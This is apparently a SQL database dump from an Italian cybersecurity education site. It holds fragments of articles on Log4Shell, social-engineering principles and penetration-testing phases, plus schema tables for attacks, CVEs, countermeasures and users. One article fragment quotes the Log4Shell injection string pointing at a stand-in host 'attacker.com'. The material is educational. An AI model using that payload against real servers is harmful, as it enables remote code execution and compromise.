Uno string come ${jndi:ldap://attacker.com/a} all''interno di un messaggio di log è sufficiente a compromettere il server. La patch è disponibile dalla versione 2.15.0.','2026-04-22',11);

1. Reciprocità
2. Impegno e coerenza
3. Riprova sociale
4. Autorità
5. Simpatia
6. Scarcity (urgenza)

La consapevolezza di questi principi è il primo passo per la difesa dal phishing, vishing e smishing. La formazione periodica del personale riduce significativamente il tasso di successo di questi attacchi.','2026-04-22',10);

1. Reconnaissance: raccolta passiva e attiva di informazioni
2. Scanning: identificazione di host, porte e servizi
3. Exploitation: sfruttamento delle vulnerabilità identificate
4. Post-Exploitation: movimento laterale e persistence
5. Reporting: documentazione dettagliata con severity e raccomandazioni

Le metodologie di riferimento includono PTES, OWASP Testing Guide e NIST SP 800-115.','2026-04-22',11);
CREATE TABLE "attacco" ("id_attacco" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "nome" varchar(200) NOT NULL, "descrizione" text NOT NULL, "severita" varchar(10) NOT NULL, "data_pubblicazione" date NOT NULL, "riferimento_mitre" varchar(50) NOT NULL, "immagine" varchar(100) NULL, "id_autore" integer NOT NULL REFERENCES "utenti" ("id_utente") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "attacco_malware" ("attacco_id" integer NOT NULL PRIMARY KEY REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED, "tipo_payload" varchar(50) NOT NULL, "persistenza" bool NOT NULL, "propagazione" varchar(100) NOT NULL);
CREATE TABLE "attacco_rete" ("attacco_id" integer NOT NULL PRIMARY KEY REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED, "protocollo" varchar(20) NOT NULL, "porta_bersaglio" integer NULL, "livello_osi" varchar(20) NOT NULL);
CREATE TABLE "attacco_social" ("attacco_id" integer NOT NULL PRIMARY KEY REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED, "canale" varchar(20) NOT NULL, "leva_psicologica" varchar(100) NOT NULL);
CREATE TABLE "attacco_web" ("attacco_id" integer NOT NULL PRIMARY KEY REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED, "tipo_injection" varchar(50) NOT NULL, "owasp_category" varchar(10) NOT NULL, "url_esempio" varchar(200) NOT NULL);
CREATE TABLE "auth_group" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "name" varchar(150) NOT NULL UNIQUE);
CREATE TABLE "auth_group_permissions" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "group_id" integer NOT NULL REFERENCES "auth_group" ("id") DEFERRABLE INITIALLY DEFERRED, "permission_id" integer NOT NULL REFERENCES "auth_permission" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "auth_permission" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "content_type_id" integer NOT NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED, "codename" varchar(100) NOT NULL, "name" varchar(255) NOT NULL);
CREATE TABLE "auth_user" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "password" varchar(128) NOT NULL, "last_login" datetime NULL, "is_superuser" bool NOT NULL, "username" varchar(150) NOT NULL UNIQUE, "last_name" varchar(150) NOT NULL, "email" varchar(254) NOT NULL, "is_staff" bool NOT NULL, "is_active" bool NOT NULL, "date_joined" datetime NOT NULL, "first_name" varchar(150) NOT NULL);
CREATE TABLE "auth_user_groups" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "user_id" integer NOT NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "group_id" integer NOT NULL REFERENCES "auth_group" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "auth_user_user_permissions" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "user_id" integer NOT NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "permission_id" integer NOT NULL REFERENCES "auth_permission" ("id") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "caso_reale" ("id_caso" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "nome_incidente" varchar(200) NOT NULL, "anno" integer NOT NULL, "vittima" varchar(200) NOT NULL, "danno_stimato_usd" bigint NULL, "descrizione_breve" text NOT NULL, "id_attacco" integer NOT NULL REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "contromisura" ("id_contromisura" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "nome" varchar(200) NOT NULL, "descrizione" text NOT NULL, "tipo" varchar(12) NOT NULL);
CREATE TABLE "django_admin_log" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "object_id" text NULL, "object_repr" varchar(200) NOT NULL, "action_flag" smallint unsigned NOT NULL CHECK ("action_flag" >= 0), "change_message" text NOT NULL, "content_type_id" integer NULL REFERENCES "django_content_type" ("id") DEFERRABLE INITIALLY DEFERRED, "user_id" integer NOT NULL REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED, "action_time" datetime NOT NULL);
CREATE TABLE "django_content_type" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "app_label" varchar(100) NOT NULL, "model" varchar(100) NOT NULL);
CREATE TABLE "django_migrations" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "app" varchar(255) NOT NULL, "name" varchar(255) NOT NULL, "applied" datetime NOT NULL);
CREATE TABLE "django_session" ("session_key" varchar(40) NOT NULL PRIMARY KEY, "session_data" text NOT NULL, "expire_date" datetime NOT NULL);
CREATE TABLE "interazione" ("id_interazione" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "tipo" varchar(12) NOT NULL, "testo_commento" text NULL, "data" datetime NOT NULL, "id_utente" integer NOT NULL REFERENCES "utenti" ("id_utente") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "interazione_articolo" ("interazione_id" integer NOT NULL PRIMARY KEY REFERENCES "interazione" ("id_interazione") DEFERRABLE INITIALLY DEFERRED, "id_articolo" integer NOT NULL REFERENCES "articolo" ("id_articolo") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "interazione_attacco" ("interazione_id" integer NOT NULL PRIMARY KEY REFERENCES "interazione" ("id_interazione") DEFERRABLE INITIALLY DEFERRED, "id_attacco" integer NOT NULL REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "interazione_caso" ("interazione_id" integer NOT NULL PRIMARY KEY REFERENCES "interazione" ("id_interazione") DEFERRABLE INITIALLY DEFERRED, "id_caso" integer NOT NULL REFERENCES "caso_reale" ("id_caso") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "mitiga" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "efficacia" varchar(6) NOT NULL, "id_attacco" integer NOT NULL REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED, "id_contromisura" integer NOT NULL REFERENCES "contromisura" ("id_contromisura") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "seguito" ("id_seguito" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "id_seguace" integer NOT NULL REFERENCES "utenti" ("id_utente") DEFERRABLE INITIALLY DEFERRED, "id_utente_seguito" integer NOT NULL REFERENCES "utenti" ("id_utente") DEFERRABLE INITIALLY DEFERRED, CONSTRAINT "no_self_follow" CHECK (NOT ("id_seguace" = ("id_utente_seguito"))));
CREATE TABLE "sfrutta" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "id_attacco" integer NOT NULL REFERENCES "attacco" ("id_attacco") DEFERRABLE INITIALLY DEFERRED, "id_vulnerabilita" integer NOT NULL REFERENCES "vulnerabilita" ("id_vulnerabilita") DEFERRABLE INITIALLY DEFERRED);
CREATE TABLE "utenti" ("id_utente" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "username" varchar(20) NOT NULL UNIQUE, "email" varchar(254) NOT NULL UNIQUE, "password" varchar(128) NOT NULL, "data_registrazione" date NOT NULL, "livello" integer NOT NULL, "bio" text NOT NULL, "foto_profilo" varchar(100) NULL);
CREATE TABLE "vulnerabilita" ("id_vulnerabilita" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "codice_cve" varchar(20) NOT NULL UNIQUE, "descrizione" text NOT NULL, "cvss_score" decimal NOT NULL, "software_affetto" varchar(200) NOT NULL, "anno_scoperta" integer NOT NULL, CONSTRAINT "cvss_range" CHECK (("cvss_score" >= '0' AND "cvss_score" <= '10')), CONSTRAINT "anno_scoperta_min" CHECK ("anno_scoperta" >= 1980));
